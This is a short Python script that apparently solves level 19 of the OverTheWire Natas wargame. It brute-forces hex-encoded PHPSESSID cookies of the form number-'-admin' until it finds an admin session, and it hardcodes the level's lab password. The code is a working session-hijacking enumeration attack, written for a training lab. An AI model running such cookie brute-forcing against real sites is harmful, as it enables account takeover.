import requests as req
import binascii as bi

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
url = "http://natas19.natas.labs.overthewire.org"

session = req.Session()
maxID = 640

for e in range(1, maxID+1):
    encodedCookie = str(bi.hexlify((str(e)+"-admin").encode('utf-8')))

    response = session.post(url, cookies={"PHPSESSID":
        encodedCookie[2:len(encodedCookie)-1]} , auth=(username, password))
    respondedContent = response.text

    if ("You are an admin. The credentials for the next level are:" in
            respondedContent):
        print("Found the admin session! PHPSESSID: ", encodedCookie)
        print("Decode PHPSESSID: ", e)
        print(respondedContent)
        break
    else:
        print("Searching for admin session, PHPSESSID",
                encodedCookie[2:len(encodedCookie)-1], "decoded", e)
